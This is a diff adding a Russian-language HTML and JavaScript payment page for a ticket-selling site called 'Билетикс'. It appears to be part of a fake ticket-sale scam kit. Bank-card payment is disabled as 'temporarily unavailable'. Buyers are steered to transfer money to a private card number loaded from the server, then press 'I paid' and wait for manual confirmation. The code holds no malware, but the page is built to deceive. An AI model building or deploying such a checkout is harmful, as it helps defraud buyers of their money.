@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Оплата заказа — Билетикс</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    
+    :root {
+      --bg-primary: #0a0a14;
+      --bg-secondary: #12121f;
+      --bg-card: #1a1a2e;
+      --bg-hover: #252540;
+      --text-primary: #ffffff;
+      --text-secondary: rgba(255,255,255,0.7);
+      --text-muted: rgba(255,255,255,0.5);
+      --accent: #667eea;
+      --accent-light: #a5b4fc;
+      --green: #4ade80;
+    }
+    
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: var(--bg-primary);
+      min-height: 100vh;
+      color: var(--text-primary);
+      line-height: 1.5;
+    }
+    
+    a { color: inherit; text-decoration: none; }
+    
+    .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
+    
+    .header {
+      background: var(--bg-secondary);
+      border-bottom: 1px solid rgba(255,255,255,0.08);
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+    
+    .header-inner {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      height: 64px;
+    }
+    
+    .logo {
+      font-size: 28px;
+      font-weight: 800;
+      background: linear-gradient(135deg, var(--accent) 0%, #764ba2 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+    
+    .nav { display: flex; gap: 30px; }
+    .nav a { color: var(--text-secondary); font-size: 15px; font-weight: 500; transition: color 0.2s; }
+    .nav a:hover { color: var(--text-primary); }
+    
+    .header-actions { display: flex; align-items: center; gap: 15px; }
+    
+    .city-select {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      padding: 8px 14px;
+      background: rgba(255,255,255,0.05);
+      border: 1px solid rgba(255,255,255,0.1);
+      border-radius: 8px;
+      color: var(--text-primary);
+      font-size: 14px;
+      cursor: pointer;
+    }
+    
+    .main-content {
+      min-height: 70vh;
+      padding: 40px 0;
+    }
+    
+    .payment-container {
+      max-width: 500px;
+      margin: 0 auto;
+    }
+    
+    .loading {
+      text-align: center;
+      padding: 60px;
+      color: var(--text-muted);
+    }
+    
+    .error-page {
+      text-align: center;
+      padding: 60px;
+    }
+    .error-page h1 { color: #f87171; font-size: 24px; margin-bottom: 15px; }
+    
+    .card {
+      background: var(--bg-card);
+      border: 1px solid rgba(255,255,255,0.08);
+      border-radius: 16px;
+      padding: 25px;
+      margin-bottom: 20px;
+    }
+    
+    .order-header { text-align: center; margin-bottom: 25px; }
+    .order-header h1 { font-size: 22px; margin-bottom: 10px; }
+    .order-code {
+      display: inline-block;
+      background: rgba(102, 126, 234, 0.2);
+      padding: 8px 20px;
+      border-radius: 8px;
+      font-family: monospace;
+      font-size: 16px;
+      letter-spacing: 2px;
+    }
+    
+    .event-summary {
+      background: rgba(255,255,255,0.03);
+      border-radius: 12px;
+      padding: 15px;
+      margin-bottom: 20px;
+    }
+    .event-summary h3 { font-size: 16px; margin-bottom: 5px; }
+    .event-summary p { color: var(--text-muted); font-size: 14px; }
+    
+    .amount-display { text-align: center; margin: 25px 0; }
+    .amount-label { color: var(--text-muted); font-size: 14px; margin-bottom: 8px; }
+    .amount-value { font-size: 42px; font-weight: bold; color: var(--green); }
+    
+    .payment-methods h2 { font-size: 16px; margin-bottom: 20px; text-align: center; }
+    
+    .method-btn {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      width: 100%;
+      padding: 18px;
+      margin-bottom: 12px;
+      border: 1px solid rgba(255,255,255,0.1);
+      border-radius: 12px;
+      background: rgba(255,255,255,0.03);
+      color: #fff;
+      font-size: 15px;
+      cursor: pointer;
+      transition: all 0.2s;
+      text-align: left;
+    }
+    .method-btn:hover:not(.disabled) { border-color: var(--accent); background: rgba(102, 126, 234, 0.1); }
+    .method-btn.disabled { opacity: 0.4; cursor: not-allowed; }
+    .method-btn .icon { font-size: 28px; }
+    .method-btn .text { flex: 1; }
+    .method-btn .title { font-weight: 600; margin-bottom: 3px; }
+    .method-btn .subtitle { font-size: 12px; color: var(--text-muted); }
+    .method-btn .arrow { color: var(--text-muted); }
+
+    .sbp-page, .waiting-page, .success-page, .failed-page { display: none; }
+    
+    .back-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      color: var(--text-muted);
+      font-size: 14px;
+      cursor: pointer;
+      margin-bottom: 20px;
+    }
+    .back-btn:hover { color: #fff; }
+    
+    .requisites-card {
+      background: linear-gradient(135deg, rgba(102, 126, 234, 0.15), rgba(118, 75, 162, 0.15));
+      border: 1px solid rgba(102, 126, 234, 0.3);
+      border-radius: 16px;
+      padding: 25px;
+      text-align: center;
+    }
+    .bank-label { color: var(--text-muted); font-size: 13px; margin-bottom: 15px; }
+    .card-number { font-size: 26px; font-family: monospace; letter-spacing: 3px; margin-bottom: 8px; }
+    .card-holder { color: var(--text-secondary); font-size: 15px; margin-bottom: 20px; }
+    
+    .copy-btn {
+      background: linear-gradient(135deg, #667eea, #764ba2);
+      border: none;
+      border-radius: 10px;
+      padding: 14px 28px;
+      color: #fff;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+    .copy-btn:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(102, 126, 234, 0.3); }
+    .copy-btn.copied { background: linear-gradient(135deg, #4ade80, #22c55e); }
+    
+    .instructions {
+      margin-top: 25px;
+      padding: 20px;
+      background: rgba(0,0,0,0.3);
+      border-radius: 12px;
+    }
+    .instructions h3 { font-size: 14px; color: var(--text-muted); margin-bottom: 12px; }
+    .instructions ol { list-style-position: inside; color: var(--text-muted); font-size: 14px; line-height: 2; }
+    
+    .paid-btn {
+      width: 100%;
+      padding: 18px;
+      margin-top: 25px;
+      border: none;
+      border-radius: 12px;
+      background: #4ade80;
+      color: #000;
+      font-size: 17px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+    .paid-btn:hover { background: #22c55e; transform: translateY(-2px); }
+
+    .waiting-content { text-align: center; padding: 40px 20px; }
+    .spinner {
+      width: 60px;
+      height: 60px;
+      border: 4px solid rgba(255,255,255,0.1);
+      border-top-color: var(--accent);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 25px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .waiting-content h2 { font-size: 22px; margin-bottom: 15px; }
+    .waiting-content p { color: var(--text-muted); font-size: 15px; line-height: 1.6; }
+    .waiting-timer { margin-top: 20px; color: var(--text-muted); font-size: 13px; }
+
+    .success-content, .failed-content { text-align: center; padding: 40px 20px; }
+    .success-icon { font-size: 80px; margin-bottom: 20px; }
+    .success-content h2 { color: var(--green); font-size: 24px; margin-bottom: 15px; }
+    .success-content p { color: var(--text-secondary); margin-bottom: 30px; }
+    
+    .ticket-box {
+      background: linear-gradient(135deg, rgba(74, 222, 128, 0.1), rgba(34, 197, 94, 0.1));
+      border: 2px dashed rgba(74, 222, 128, 0.4);
+      border-radius: 16px;
+      padding: 30px;
+      margin-bottom: 20px;
+    }
+    .ticket-box h3 { color: var(--green); font-size: 14px; margin-bottom: 15px; }
+    .ticket-code { font-size: 32px; font-family: monospace; letter-spacing: 3px; margin-bottom: 10px; }
+    .ticket-event { color: var(--text-secondary); font-size: 16px; }
+    .ticket-info { font-size: 14px; color: var(--text-muted); margin-top: 15px; }
+
+    .failed-icon { font-size: 80px; margin-bottom: 20px; }
+    .failed-content h2 { color: #f87171; font-size: 24px; margin-bottom: 15px; }
+    .failed-content p { color: var(--text-secondary); margin-bottom: 20px; line-height: 1.6; }
+    
+    .retry-btn {
+      display: inline-block;
+      padding: 14px 30px;
+      background: rgba(255,255,255,0.1);
+      border: 1px solid rgba(255,255,255,0.2);
+      border-radius: 10px;
+      color: #fff;
+      font-size: 15px;
+      cursor: pointer;
+      transition: all 0.2s;
+      margin: 5px;
+    }
+    .retry-btn:hover { background: rgba(255,255,255,0.15); }
+    .support-link { display: block; margin-top: 20px; color: var(--accent-light); font-size: 14px; }
+
+    .footer {
+      background: var(--bg-secondary);
+      border-top: 1px solid rgba(255,255,255,0.08);
+      padding: 40px 0;
+      margin-top: 60px;
+    }
+    .footer-inner { display: flex; justify-content: space-between; align-items: center; }
+    .footer-links { display: flex; gap: 30px; }
+    .footer-links a { color: var(--text-muted); font-size: 14px; }
+    .footer-links a:hover { color: var(--text-primary); }
+    .footer-copy { color: var(--text-muted); font-size: 13px; }
+    
+    @media (max-width: 600px) {
+      .nav { display: none; }
+      .amount-value { font-size: 32px; }
+    }
+  </style>
+</head>
+<body>
+  <header class="header">
+    <div class="container header-inner">
+      <a href="/" class="logo">БИЛЕТИКС</a>
+      <nav class="nav">
+        <a href="/">Главная</a>
+        <a href="/#concerts">Концерты</a>
+        <a href="/#theatre">Театр</a>
+        <a href="/#exhibitions">Выставки</a>
+        <a href="/#kids">Детям</a>
+      </nav>
+      <div class="header-actions">
+        <button class="city-select">
+          <span>📍</span>
+          <span>Москва</span>
+        </button>
+      </div>
+    </div>
+  </header>
+
+  <main class="main-content">
+    <div class="payment-container">
+      <div class="loading" id="loading">Загрузка...</div>
+      
+      <div class="error-page" id="errorPage" style="display: none;">
+        <h1>Заказ не найден</h1>
+        <p style="color: var(--text-muted);">Проверьте правильность ссылки</p>
+        <a href="/" style="display: inline-block; margin-top: 20px; color: var(--accent-light);">← На главную</a>
+      </div>
+
+      <div class="payment-select" id="paymentSelect" style="display: none;">
+        <div class="card order-header">
+          <h1>Оплата заказа</h1>
+          <div class="order-code" id="orderCodeDisplay"></div>
+        </div>
+
+        <div class="card event-summary" id="eventSummary">
+          <h3 id="summaryEventName">Мероприятие</h3>
+          <p id="summaryDetails">Загрузка...</p>
+        </div>
+
+        <div class="amount-display">
+          <div class="amount-label">К оплате</div>
+          <div class="amount-value" id="amountDisplay">0 ₽</div>
+        </div>
+
+        <div class="card payment-methods">
+          <h2>Выберите способ оплаты</h2>
+          <button class="method-btn disabled">
+            <span class="icon">💳</span>
+            <span class="text">
+              <div class="title">Банковская карта</div>
+              <div class="subtitle">Временно недоступно</div>
+            </span>
+          </button>
+          <button class="method-btn" onclick="showSbpPage()">
+            <span class="icon">📱</span>
+            <span class="text">
+              <div class="title">СБП (Система быстрых платежей)</div>
+              <div class="subtitle">Перевод по номеру карты</div>
+            </span>
+            <span class="arrow">→</span>
+          </button>
+        </div>
+      </div>
+
+      <div class="sbp-page" id="sbpPage">
+        <a class="back-btn" onclick="showPaymentSelect()">← Назад к выбору оплаты</a>
+        
+        <div class="card order-header">
+          <h1>Оплата через СБП</h1>
+          <div class="order-code" id="orderCodeSbp"></div>
+        </div>
+
+        <div class="amount-display">
+          <div class="amount-label">Сумма перевода</div>
+          <div class="amount-value" id="amountSbp">0 ₽</div>
+        </div>
+
+        <div class="requisites-card">
+          <div class="bank-label" id="bankName">Сбербанк</div>
+          <div class="card-number" id="cardNumber">0000 0000 0000 0000</div>
+          <div class="card-holder" id="cardHolder">ИМЯ ВЛАДЕЛЬЦА</div>
+          <button class="copy-btn" onclick="copyCardNumber()">📋 Скопировать номер</button>
+        </div>
+
+        <div class="instructions">
+          <h3>Инструкция:</h3>
+          <ol>
+            <li>Откройте приложение банка</li>
+            <li>Выберите "Перевод по номеру карты"</li>
+            <li>Введите номер и сумму</li>
+            <li>Подтвердите перевод</li>
+          </ol>
+        </div>
+
+        <button class="paid-btn" onclick="markAsPaid()">✅ Я оплатил</button>
+      </div>
+
+      <div class="waiting-page" id="waitingPage">
+        <div class="card waiting-content">
+          <div class="spinner"></div>
+          <h2>Проверяем оплату...</h2>
+          <p>Ожидайте подтверждения оплаты.<br>Это может занять несколько минут.</p>
+          <div class="waiting-timer" id="waitingTimer">Проверка статуса...</div>
+        </div>
+      </div>
+
+      <div class="success-page" id="successPage">
+        <div class="card success-content">
+          <div class="success-icon">🎉</div>
+          <h2>Оплата подтверждена!</h2>
+          <p>Спасибо за покупку! Ваш билет готов.</p>
+          
+          <div class="ticket-box">
+            <h3>ВАШ БИЛЕТ</h3>
+            <div class="ticket-code" id="ticketCode"></div>
+            <div class="ticket-event" id="ticketEvent"></div>
+            <div class="ticket-info" id="ticketInfo"></div>
+          </div>
+          
+          <p style="font-size: 13px; color: var(--text-muted);">
+            Сохраните этот код — он понадобится на входе
+          </p>
+          
+          <a href="/" style="display: inline-block; margin-top: 20px; padding: 12px 24px; background: var(--accent); border-radius: 8px; font-weight: 600;">На главную</a>
+        </div>
+      </div>
+
+      <div class="failed-page" id="failedPage">
+        <div class="card failed-content">
+          <div class="failed-icon">❌</div>
+          <h2>Платёж не найден</h2>
+          <p>Мы не нашли ваш перевод. Возможно, он ещё обрабатывается банком.</p>
+          
+          <button class="retry-btn" onclick="retryCheck()">🔄 Проверить ещё раз</button>
+          <button class="retry-btn" onclick="showSbpPage()">💳 К реквизитам</button>
+          
+          <a class="support-link" href="#">Написать в поддержку</a>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="container footer-inner">
+      <div class="footer-links">
+        <a href="#">О нас</a>
+        <a href="#">Контакты</a>
+        <a href="#">Помощь</a>
+        <a href="#">Реклама</a>
+      </div>
+      <div class="footer-copy">© 2025 Билетикс. Все права защищены.</div>
+    </div>
+  </footer>
+
+  <script>
+    let orderData = null;
+    let paymentSettings = null;
+    let checkInterval = null;
+    let checkCount = 0;
+    const maxChecks = 60;
+
+    async function init() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const orderCode = urlParams.get('order');
+      
+      if (!orderCode) {
+        showError();
+        return;
+      }
+
+      try {
+        const [orderRes, settingsRes] = await Promise.all([
+          fetch(`/api/ticket-order/${orderCode}`),
+          fetch(`/api/ticket-order/${orderCode}/payment-settings`)
+        ]);
+        
+        if (!orderRes.ok) {
+          showError();
+          return;
+        }
+        
+        orderData = await orderRes.json();
+        paymentSettings = await settingsRes.json();
+        
+        if (!orderData || orderData.error) {
+          showError();
+          return;
+        }
+        
+        if (orderData.status === 'confirmed') {
+          showSuccessPage();
+          return;
+        }
+        
+        if (orderData.status === 'waiting_confirmation') {
+          showWaitingPage();
+          startStatusCheck();
+          return;
+        }
+        
+        renderPayment();
+      } catch (err) {
+        console.error('Error:', err);
+        showError();
+      }
+    }
+
+    function showError() {
+      document.getElementById('loading').style.display = 'none';
+      document.getElementById('errorPage').style.display = 'block';
+    }
+
+    function renderPayment() {
+      document.getElementById('loading').style.display = 'none';
+      document.getElementById('paymentSelect').style.display = 'block';
+      
+      const amount = orderData.totalPrice.toLocaleString() + ' ₽';
+      document.getElementById('orderCodeDisplay').textContent = orderData.orderCode;
+      document.getElementById('amountDisplay').textContent = amount;
+      document.getElementById('orderCodeSbp').textContent = orderData.orderCode;
+      document.getElementById('amountSbp').textContent = amount;
+      
+      document.getElementById('summaryEventName').textContent = orderData.eventName;
+      document.getElementById('summaryDetails').textContent = `${orderData.seatsCount} билет(ов)`;
+      
+      if (paymentSettings && paymentSettings.cardNumber) {
+        document.getElementById('cardNumber').textContent = paymentSettings.cardNumber;
+        document.getElementById('cardHolder').textContent = (paymentSettings.cardHolderName || 'ВЛАДЕЛЕЦ КАРТЫ').toUpperCase();
+        document.getElementById('bankName').textContent = paymentSettings.bankName || 'Банк';
+      }
+    }
+
+    function showPaymentSelect() {
+      hideAll();
+      document.getElementById('paymentSelect').style.display = 'block';
+    }
+
+    function showSbpPage() {
+      hideAll();
+      document.getElementById('sbpPage').style.display = 'block';
+    }
+
+    function showWaitingPage() {
+      hideAll();
+      document.getElementById('waitingPage').style.display = 'block';
+    }
+
+    function showSuccessPage() {
+      hideAll();
+      document.getElementById('successPage').style.display = 'block';
+      document.getElementById('ticketCode').textContent = orderData.orderCode;
+      document.getElementById('ticketEvent').textContent = orderData.eventName;
+      document.getElementById('ticketInfo').textContent = `${orderData.seatsCount} билет(ов) • ${orderData.totalPrice.toLocaleString()} ₽`;
+    }
+
+    function showFailedPage() {
+      hideAll();
+      document.getElementById('failedPage').style.display = 'block';
+    }
+
+    function hideAll() {
+      document.getElementById('loading').style.display = 'none';
+      document.getElementById('errorPage').style.display = 'none';
+      document.getElementById('paymentSelect').style.display = 'none';
+      document.getElementById('sbpPage').style.display = 'none';
+      document.getElementById('waitingPage').style.display = 'none';
+      document.getElementById('successPage').style.display = 'none';
+      document.getElementById('failedPage').style.display = 'none';
+    }
+
+    function copyCardNumber() {
+      const cardNumber = document.getElementById('cardNumber').textContent.replace(/\s/g, '');
+      navigator.clipboard.writeText(cardNumber).then(() => {
+        const btn = document.querySelector('.copy-btn');
+        btn.textContent = '✅ Скопировано!';
+        btn.classList.add('copied');
+        setTimeout(() => {
+          btn.textContent = '📋 Скопировать номер';
+          btn.classList.remove('copied');
+        }, 2000);
+      });
+    }
+
+    async function markAsPaid() {
+      try {
+        const res = await fetch(`/api/ticket-order/${orderData.orderCode}/mark-paid`, {
+          method: 'POST'
+        });
+        const result = await res.json();
+        
+        if (result.success) {
+          orderData.status = 'waiting_confirmation';
+          showWaitingPage();
+          startStatusCheck();
+        } else {
+          alert(result.message || 'Ошибка');
+        }
+      } catch (err) {
+        alert('Ошибка соединения');
+      }
+    }
+
+    function startStatusCheck() {
+      checkCount = 0;
+      checkInterval = setInterval(checkStatus, 5000);
+      updateTimer();
+    }
+
+    async function checkStatus() {
+      checkCount++;
+      updateTimer();
+      
+      try {
+        const res = await fetch(`/api/ticket-order/${orderData.orderCode}`);
+        const data = await res.json();
+        
+        if (data.status === 'confirmed') {
+          clearInterval(checkInterval);
+          orderData = data;
+          showSuccessPage();
+        } else if (data.status === 'rejected' || checkCount >= maxChecks) {
+          clearInterval(checkInterval);
+          showFailedPage();
+        }
+      } catch (err) {
+        console.error('Status check error:', err);
+      }
+    }
+
+    function updateTimer() {
+      const remaining = maxChecks - checkCount;
+      document.getElementById('waitingTimer').textContent = 
+        `Автоматическая проверка каждые 5 сек (осталось ${remaining} попыток)`;
+    }
+
+    function retryCheck() {
+      showWaitingPage();
+      startStatusCheck();
+    }
+
+    init();
+  </script>
+</body>
+</html>
